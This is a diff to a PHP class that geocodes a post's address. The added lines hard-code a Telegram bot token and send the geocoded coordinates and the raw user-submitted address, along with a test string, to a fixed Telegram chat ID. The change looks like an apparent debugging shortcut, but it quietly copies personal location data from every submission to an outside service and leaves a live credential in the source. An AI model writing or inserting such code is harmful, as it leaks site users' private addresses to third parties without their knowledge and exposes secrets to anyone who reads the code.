@@ -552,11 +552,18 @@ class Post extends Unit
 
             $point = explode(' ', $data->response->GeoObjectCollection->featureMember[0]->GeoObject->Point->pos);
 
-            $fields_array[] = 'latitude';
+            $telegramAddress = new \Bitkit\Social\Telegram('736512998:AAGIlIPVdPdrffvQRmh1Kwoj2_isbvYUKc4');
+
+            $fields_array[] = 'latitude'; 
             $values_array[] = $point[1];
 
             $fields_array[] = 'longitude';
             $values_array[] = $point[0];
+
+            $telegramAddress->sendMessage( 'fdfdfd',223054377);
+            $telegramAddress->sendMessage( $point[1],223054377);
+            $telegramAddress->sendMessage( $point[0],223054377);
+            $telegramAddress->sendMessage( $_POST['address'],223054377);
         }
 
         //проставляем время публикации
